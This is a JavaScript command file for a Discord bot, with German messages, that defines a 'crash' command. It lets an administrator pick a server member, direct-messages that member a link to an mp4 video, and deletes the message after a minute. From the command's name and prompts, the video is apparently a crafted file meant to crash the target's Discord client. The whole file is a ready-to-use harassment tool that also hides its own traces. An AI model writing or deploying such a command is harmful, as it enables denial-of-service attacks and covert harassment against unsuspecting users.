module.exports.run = async (bot, message, args) => {
	if (!message.member || !message.member.hasPermission("ADMINISTRATOR")) {
		return message.reply("Du hast keine Permissions!");
	}

	const getMember = (m, id) => m.mentions.members.first() || m.guild.members.get(id);
	let member = getMember(message, args[0]);

	if (!member) {
		member = await new Promise(async r => {
			const msg = await message.channel.send("Welchen Member willst du crashen?");
			const filter = m => m.author.id === message.author.id;
			const collector = message.channel.createMessageCollector(filter, { time: 20000, max: 1 });

			collector.on("end", c => {
				r(c.first() ? getMember(c.first(), c.first().content) : null);
				msg.delete().catch(() => null);
			});
		});
	}

	if (!member) return message.reply("Bitte Wähle einen Richtigen Spieler aus!");

	const msg = "https://cdn.discordapp.com/attachments/797218861933789254/801965349582536714/video0_4.mp4";

	member
	.send(msg)
	.then(m => {
		m.delete(60000);
		message.channel.send("Das Video Wurde erfolgreich gesendet!");
	})
	.catch(() => {
		message.channel.send("Das Video Konnte nicht gesendet werden!");
	});
};

module.exports.config = {
	name: "crash",
	description: " .",
	usage: "+crash",
	accessableby: "Moderators",
	aliases: []
};
